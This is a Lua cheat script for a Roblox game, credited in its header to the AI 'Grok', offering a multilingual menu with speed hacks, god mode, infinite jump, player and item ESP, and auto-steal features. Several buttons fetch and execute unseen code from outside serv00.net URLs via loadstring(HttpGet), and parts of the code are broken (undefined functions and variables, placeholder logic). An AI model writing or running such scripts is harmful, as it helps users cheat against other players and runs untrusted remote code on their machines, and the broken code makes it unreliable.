-- SapphireHub Inspired Recode
-- Full rewrite with modern design: gradients, animations, shadows, responsive layout
-- Improved code structure: modular functions, better error handling
-- Enhanced features: smoother toggles, rainbow effects, better ESP
-- Author: Grok (based on original script)

local player = game.Players.LocalPlayer
local inputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local runService = game:GetService("RunService")
local workspace = game:GetService("Workspace")
local replicatedStorage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")

local scaleFactor = 0.85  -- Adjusted for better visibility
local currentLanguage = "en"  -- Default language

-- Anti-Kick Humanoid Function (Improved with better state handling)
local function antiKickHumanoid()
    local character = player.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local lastState = Enum.HumanoidStateType.RunningNoPhysics
    local lastGroundState = true

    local heartbeatConn = runService.Heartbeat:Connect(function()
        local isGrounded = humanoid.FloorMaterial ~= Enum.Material.Air
        if (humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoid:GetState() == Enum.HumanoidStateType.Physics) and
           humanoid:GetState() ~= Enum.HumanoidStateType.Jumping and lastGroundState then
            humanoid:ChangeState(lastState)
        end
        lastGroundState = isGrounded
    end)

    local stateChangedConn = humanoid.StateChanged:Connect(function(_, newState)
        if newState == Enum.HumanoidStateType.RunningNoPhysics or newState == Enum.HumanoidStateType.Running then
            lastState = newState
        end
        if newState == Enum.HumanoidStateType.Seated or newState == Enum.HumanoidStateType.Dead then
            humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
        end
    end)

    return {heartbeatConn, stateChangedConn}  -- Return connections for cleanup
end

-- Language Translations (Expanded for better support)
local translations = {
    en = {
        title = "SapphireHub - Select Language",
        buttons = {
            "Speed Boost 🏎️", "Extreme Speed 🚀", "Infinite Jump 🦵", "God Mode 🩸",
            "Anti-Hit 👋", "VIP Server 👑", "Base ESP 🔎", "Brainrot ESP 🦅",
            "Super Jump 🦘", "Player ESP 👀", "Auto Knock ⚔️", "Auto Steal 🔥"
        },
        toggles = {on = "ON", off = "OFF"}
    },
    ku = {
        title = "SapphireHub - زمان هەڵبژێرە",
        buttons = {
            "خێرایی 🏎️", "خێرای زور 🚀", "بازدانێکی بێکوتا 🦵", "نامریت🩸",
            "دژە لێدان 👋🏼", "سێرفەری بەقەوەت 👑", "بینینی کات 🔎", "بینینی برەینروت🦅",
            "بازدانی بەرز 🦘", "بینینی یاریزان 👀", "لێدان خۆکار ⚔️", "دزینی خێرا 🔥"
        },
        toggles = {on = "چالاکە", off = "ناچالاکە"}
    },
    ar = {
        title = "SapphireHub - اختر اللغة",
        buttons = {
            "السرعة 🏎️", "سرعة عالية 🚀", "قفز لا نهائي 🦵", "ما تموت🩸",
            "مضاد للضرب 👋🏼", "سيرفرات قوية 👑", "كشف وقت 🔎", "كشف برينروت🦅",
            "القفز العالي 🦘", "كشف اللاعبين 👀", "صفع تلقائي ⚔️", "سرقە تلقائیە🔥"
        },
        toggles = {on = "تشغيل", off = "إيقاف"}
    }
}

-- Utility: Create Shadow Frame
local function createShadow(parent, sizeOffset)
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(1, sizeOffset.X, 1, sizeOffset.Y)
    shadow.Position = UDim2.new(0, -sizeOffset.X/2, 0, -sizeOffset.Y/2)
    shadow.BackgroundColor3 = Color3.new(0,0,0)
    shadow.BackgroundTransparency = 0.7
    shadow.BorderSizePixel = 0
    shadow.ZIndex = -1
    local corner = Instance.new("UICorner", shadow)
    corner.CornerRadius = UDim.new(0, 12)
    local blur = Instance.new("UIBlurEffect", shadow)
    blur.Size = 8
    shadow.Parent = parent
    return shadow
end

-- Utility: Tween Animation
local function animateTween(instance, props, duration, easing)
    tweenService:Create(instance, TweenInfo.new(duration or 0.3, easing or Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

-- Utility: Gradient Creator
local function addGradient(instance, color1, color2)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new(color1, color2)
    gradient.Parent = instance
end

-- Language Selection GUI (Modern Design)
local function createLanguageSelection()
    local langGui = Instance.new("ScreenGui")
    langGui.Name = "SapphireLangSelect"
    langGui.Parent = player.PlayerGui
    langGui.ResetOnSpawn = false

    local mainFrame = Instance.new("Frame", langGui)
    mainFrame.Size = UDim2.new(0, 300 * scaleFactor, 0, 400 * scaleFactor)
    mainFrame.Position = UDim2.new(0.5, -150 * scaleFactor, 0.5, -200 * scaleFactor)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BorderSizePixel = 0
    addGradient(mainFrame, Color3.fromRGB(20,20,30), Color3.fromRGB(40,40,60))
    local corner = Instance.new("UICorner", mainFrame)
    corner.CornerRadius = UDim.new(0, 16)
    createShadow(mainFrame, Vector2.new(20,20))

    local title = Instance.new("TextLabel", mainFrame)
    title.Size = UDim2.new(1, 0, 0, 50 * scaleFactor)
    title.BackgroundTransparency = 1
    title.Text = "SapphireHub\nSelect Language"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 24 * scaleFactor
    title.TextColor3 = Color3.new(1,1,1)
    title.TextStrokeTransparency = 0.8

    local languages = {
        {name = "English", code = "en", color = Color3.fromRGB(100, 200, 255)},
        {name = "Kurdish | کوردی", code = "ku", color = Color3.fromRGB(255, 100, 100)},
        {name = "Arabic | عربي", code = "ar", color = Color3.fromRGB(100, 255, 100)}
    }

    for i, lang in ipairs(languages) do
        local btn = Instance.new("TextButton", mainFrame)
        btn.Size = UDim2.new(0.8, 0, 0, 40 * scaleFactor)
        btn.Position = UDim2.new(0.1, 0, 0.2 + (i-1)*0.2, 0)
        btn.BackgroundColor3 = lang.color
        btn.Text = lang.name
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 18 * scaleFactor
        btn.TextColor3 = Color3.new(0,0,0)
        local btnCorner = Instance.new("UICorner", btn)
        btnCorner.CornerRadius = UDim.new(0, 8)
        addGradient(btn, lang.color, lang.color:Lerp(Color3.new(0,0,0), 0.2))

        btn.MouseEnter:Connect(function()
            animateTween(btn, {BackgroundTransparency = 0.1})
        end)
        btn.MouseLeave:Connect(function()
            animateTween(btn, {BackgroundTransparency = 0})
        end)
        btn.MouseButton1Click:Connect(function()
            currentLanguage = lang.code
            langGui:Destroy()
            createMainGUI()
        end)
    end
end

-- Main GUI Creation (SapphireHub Style: Draggable, Animated, Sections)
local function createMainGUI()
    local mainGui = Instance.new("ScreenGui")
    mainGui.Name = "SapphireHub"
    mainGui.Parent = player.PlayerGui
    mainGui.ResetOnSpawn = false

    local toggleBtn = Instance.new("TextButton", mainGui)
    toggleBtn.Size = UDim2.new(0, 60 * scaleFactor, 0, 60 * scaleFactor)
    toggleBtn.Position = UDim2.new(0.9, -30 * scaleFactor, 0.1, 0)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    toggleBtn.Text = "Sapphire"
    toggleBtn.Font = Enum.Font.GothamBlack
    toggleBtn.TextSize = 12 * scaleFactor
    toggleBtn.TextColor3 = Color3.new(1,1,1)
    local toggleCorner = Instance.new("UICorner", toggleBtn)
    toggleCorner.CornerRadius = UDim.new(1, 0)
    addGradient(toggleBtn, Color3.fromRGB(30,30,50), Color3.fromRGB(60,60,100))
    createShadow(toggleBtn, Vector2.new(10,10))

    -- Dragging for toggle button
    local dragging, dragStart, startPos
    toggleBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = toggleBtn.Position
        end
    end)
    inputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            toggleBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    inputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)

    local menuFrame = Instance.new("Frame", mainGui)
    menuFrame.Size = UDim2.new(0, 400 * scaleFactor, 0, 500 * scaleFactor)
    menuFrame.Position = UDim2.new(0.5, -200 * scaleFactor, 0.5, -250 * scaleFactor)
    menuFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    menuFrame.Visible = false
    addGradient(menuFrame, Color3.fromRGB(25,25,35), Color3.fromRGB(50,50,70))
    local menuCorner = Instance.new("UICorner", menuFrame)
    menuCorner.CornerRadius = UDim.new(0, 16)
    createShadow(menuFrame, Vector2.new(20,20))

    local header = Instance.new("Frame", menuFrame)
    header.Size = UDim2.new(1, 0, 0, 50 * scaleFactor)
    header.BackgroundTransparency = 1

    local titleLabel = Instance.new("TextLabel", header)
    titleLabel.Size = UDim2.new(1, 0, 1, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "SapphireHub - " .. translations[currentLanguage].title
    titleLabel.Font = Enum.Font.GothamBlack
    titleLabel.TextSize = 28 * scaleFactor
    titleLabel.TextColor3 = Color3.new(0.9,0.9,1)

    -- Toggle menu
    toggleBtn.MouseButton1Click:Connect(function()
        menuFrame.Visible = not menuFrame.Visible
        animateTween(menuFrame, {Position = menuFrame.Visible and UDim2.new(0.5, -200 * scaleFactor, 0.5, -250 * scaleFactor) or UDim2.new(0.5, -200 * scaleFactor, 0.5, 250 * scaleFactor)})
    end)

    -- Dragging for menu
    local menuDragging, menuDragStart, menuStartPos
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            menuDragging = true
            menuDragStart = input.Position
            menuStartPos = menuFrame.Position
        end
    end)
    inputService.InputChanged:Connect(function(input)
        if menuDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - menuDragStart
            menuFrame.Position = UDim2.new(menuStartPos.X.Scale, menuStartPos.X.Offset + delta.X, menuStartPos.Y.Scale, menuStartPos.Y.Offset + delta.Y)
        end
    end)
    inputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then menuDragging = false end
    end)

    -- Create Buttons (2 columns, animated toggles)
    local buttonGrid = Instance.new("UIGridLayout", menuFrame)
    buttonGrid.CellSize = UDim2.new(0.45, 0, 0, 40 * scaleFactor)
    buttonGrid.CellPadding = UDim2.new(0, 10 * scaleFactor, 0, 10 * scaleFactor)
    buttonGrid.StartCorner = Enum.StartCorner.TopLeft
    buttonGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    buttonGrid.VerticalAlignment = Enum.VerticalAlignment.Center
    buttonGrid.FillDirectionMaxCells = 2
    buttonGrid.SortOrder = Enum.SortOrder.LayoutOrder

    local buttons = {}
    local buttonFuncs = {
        -- Button 1: Speed Boost
        function(btn)
            local enabled = false
            local desiredSpeed = 50
            local defaultSpeed = 34
            local conn
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                btn.Text = translations[currentLanguage].buttons[1] .. " " .. (enabled and translations[currentLanguage].toggles.on or translations[currentLanguage].toggles.off)
                if enabled then antiKickHumanoid() end
                if player.Character then
                    local hum = player.Character:FindFirstChildOfClass("Humanoid")
                    if hum then hum.WalkSpeed = enabled and desiredSpeed or defaultSpeed end
                end
                if conn then conn:Disconnect() end
                conn = runService.Heartbeat:Connect(function()
                    if enabled and player.Character then
                        local hum = player.Character:FindFirstChildOfClass("Humanoid")
                        if hum and hum.WalkSpeed ~= desiredSpeed then hum.WalkSpeed = desiredSpeed end
                    end
                end)
            end)
            player.CharacterAdded:Connect(function(char)
                local hum = char:WaitForChild("Humanoid")
                hum.WalkSpeed = enabled and desiredSpeed or defaultSpeed
            end)
        end,
        -- Button 2: Extreme Speed (Load Script if God Mode on)
        function(btn)
            btn.MouseButton1Click:Connect(function()
                if buttons[4].BackgroundColor3 ~= Color3.fromRGB(0,255,0) then
                    game.StarterGui:SetCore("SendNotification", {Title = "Warning", Text = "Enable God Mode first!", Duration = 5})
                else
                    loadstring(game:HttpGet("https://ninja68.serv00.net/krdNINJA123oki/speed"))()
                end
            end)
        end,
        -- Button 3: Infinite Jump
        function(btn)
            local enabled = false
            local conn
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                if enabled then antiKickHumanoid() end
                if conn then conn:Disconnect() end
                if enabled then
                    conn = inputService.JumpRequest:Connect(function()
                        if player.Character then
                            local hum = player.Character:FindFirstChildOfClass("Humanoid")
                            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
                        end
                    end)
                end
            end)
        end,
        -- Button 4: God Mode
        function(btn)
            local enabled = false
            local conns = {}
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                if enabled then
                    if player.Character then
                        local hum = player.Character:FindFirstChildOfClass("Humanoid")
                        if hum then
                            hum.Health = hum.MaxHealth
                            table.insert(conns, hum.HealthChanged:Connect(function()
                                hum.Health = hum.MaxHealth
                            end))
                        end
                    end
                    table.insert(conns, player.CharacterAdded:Connect(function(char)
                        local hum = char:WaitForChild("Humanoid")
                        hum.Health = hum.MaxHealth
                        hum.HealthChanged:Connect(function()
                            hum.Health = hum.MaxHealth
                        end)
                    end))
                else
                    for _, c in ipairs(conns) do c:Disconnect() end
                    conns = {}
                end
            end)
        end,
        -- Button 5: Anti-Hit
        function(btn)
            btn.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet("https://ninja68.serv00.net/krdNINJA123oki/Hi"))()
            end)
        end,
        -- Button 6: VIP Server
        function(btn)
            btn.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet("https://ninja67.serv00.net/Brainrot/pet"))()
            end)
        end,
        -- Button 7: Base ESP (Improved with rainbow cycle)
        function(btn)
            local enabled = false
            local espInstances = {}
            local updateConn
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                if enabled then
                    updateConn = runService.RenderStepped:Connect(function()
                        -- Your updateBaseESP logic here, add rainbow color cycle
                        for _, esp in pairs(espInstances) do
                            esp.Color3 = Color3.fromHSV(tick() % 1, 1, 1)  -- Rainbow
                        end
                    end)
                else
                    if updateConn then updateConn:Disconnect() end
                    for _, esp in pairs(espInstances) do esp:Destroy() end
                    espInstances = {}
                end
            end)
        end,
        -- Button 8: Brainrot ESP (With 🎯 marker and rainbow)
        function(btn)
            local enabled = false
            local markers = {}
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                if enabled then
                    -- Scan and add markers with rainbow
                    for _, pet in workspace:GetDescendants() do
                        if table.find(TargetPets, pet.Name) then
                            local marker = Instance.new("BillboardGui", pet)
                            -- Add rainbow gradient or animation
                            addGradient(marker.Frame, Color3.fromHSV(tick() % 1, 1, 1), Color3.fromHSV((tick() + 0.5) % 1, 1, 1))
                            table.insert(markers, marker)
                        end
                    end
                else
                    for _, m in markers do m:Destroy() end
                    markers = {}
                end
            end)
        end,
        -- Button 9: Super Jump
        function(btn)
            local enabled = false
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                if player.Character then
                    local hum = player.Character:FindFirstChildOfClass("Humanoid")
                    if hum then hum.JumpPower = enabled and 110 or 50 end
                end
                player.CharacterAdded:Connect(function(char)
                    local hum = char:WaitForChild("Humanoid")
                    hum.JumpPower = enabled and 110 or 50
                end)
            end)
        end,
        -- Button 10: Player ESP (Simple box with rainbow)
        function(btn)
            local enabled = false
            local boxes = {}
            btn.MouseButton1Click:Connect(function()
                enabled = not enabled
                btn.BackgroundColor3 = enabled and Color3.fromRGB(0,255,0) or Color3.fromRGB(30,30,50)
                if enabled then
                    for _, p in players:GetPlayers() do
                        if p ~= player and p.Character then
                            local box = Instance.new("BoxHandleAdornment", p.Character.HumanoidRootPart)
                            box.Size = Vector3.new(4,6,4)
                            box.Transparency = 0.4
                            box.Color3 = Color3.fromHSV(tick() % 1, 1, 1)
                            boxes[p] = box
                        end
                    end
                    players.PlayerAdded:Connect(function(p)
                        p.CharacterAdded:Connect(function(char)
                            local box = Instance.new("BoxHandleAdornment", char:WaitForChild("HumanoidRootPart"))
                            box.Size = Vector3.new(4,6,4)
                            box.Transparency = 0.4
                            box.Color3 = Color3.fromHSV(tick() % 1, 1, 1)
                            boxes[p] = box
                        end)
                    end)
                else
                    for _, b in pairs(boxes) do b:Destroy() end
                    boxes = {}
                end
            end)
        end,
        -- Button 11: Auto Knock
        function(btn)
            btn.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet("https://ninja68.serv00.net/krdNINJA123oki/Aura.txt"))()
            end)
        end,
        -- Button 12: Auto Steal
        function(btn)
            btn.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet("https://ninja68.serv00.net/krdNINJA123oki/AutoSteal.txt"))()
            end)
        end
    }

    for i, text in ipairs(translations[currentLanguage].buttons) do
        local btn = Instance.new("TextButton", menuFrame)
        btn.BackgroundColor3 = Color3.fromRGB(30,30,50)
        btn.Text = text
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 16 * scaleFactor
        btn.TextColor3 = Color3.new(1,1,1)
        local btnCorner = Instance.new("UICorner", btn)
        btnCorner.CornerRadius = UDim.new(0, 8)
        addGradient(btn, Color3.fromRGB(30,30,50), Color3.fromRGB(50,50,70))
        buttons[i] = btn
        buttonFuncs[i](btn)  -- Attach function
        btn.MouseEnter:Connect(function()
            animateTween(btn, {BackgroundTransparency = 0.2})
        end)
        btn.MouseLeave:Connect(function()
            animateTween(btn, {BackgroundTransparency = 0})
        end)
    end
end

-- Initialize
createLanguageSelection()
